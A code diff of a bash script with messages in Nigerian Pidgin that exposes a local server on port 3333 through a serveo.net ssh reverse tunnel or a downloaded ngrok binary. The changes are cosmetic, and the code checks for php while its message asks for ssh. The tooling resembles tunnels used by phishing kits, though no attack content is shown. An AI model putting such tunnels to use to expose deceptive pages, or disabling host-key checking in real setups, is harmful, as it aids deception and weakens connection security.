@@ -102,7 +102,7 @@ fi
 
 if [[ $subdomain_resp == true ]]; then
 
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
 
 sleep 8
 else
@@ -158,8 +158,8 @@ wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
 cp ngrok /usr/bin
+rm -rf ngrok-stable-linux-386.zip
 else
 printf "\e[1;93m[!]Guy e no gree download o... \e[0m\n"
 printf "\e[1;93m[!]Check if your data dey ON sef\e[0m\n"
@@ -189,13 +189,13 @@ fi
 
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok(Recommended)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok (Recommended)\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose the Port Forwarding option wey you wan use: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 1 ]]; then
 
-command -v php > /dev/null 2>&1 || { echo >&2 "You need ssh but e no dey installed. Install am like this LINUX apt-get install openssh/TERMUX pkg install openssh."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "You need ssh but e no dey installed. Install am like this LINUX apt-get install ssh/TERMUX pkg install ssh."; exit 1; }
 start
 
 elif [[ $option_server -eq 2 ]]; then
